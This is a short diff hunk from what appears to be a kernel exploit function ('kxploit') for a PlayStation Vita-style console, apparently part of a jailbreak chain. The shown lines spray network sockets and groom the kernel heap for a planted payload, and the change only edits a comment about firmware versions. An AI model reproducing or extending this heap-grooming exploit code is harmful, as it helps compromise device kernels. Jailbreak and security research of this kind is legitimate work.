@@ -322,7 +322,7 @@ function kxploit(caller, ver) {
     spray_sock[i] = sceNetSyscallSocket(
       sockname, SCE_NET_AF_INET, SCE_NET_SOCK_DGRAM, 0);
 
-  // Heap feng shui
+  // Heap feng shui for 3.63+ (!_dev)
   // 0x20+0x4000+0x8+0x20+0x148+0x8+0x20+0x550+0x8+0x20+0x4000+0x8
   net_free(0);
   net_malloc(0, 0x6e8 + PLANT_SIZE);
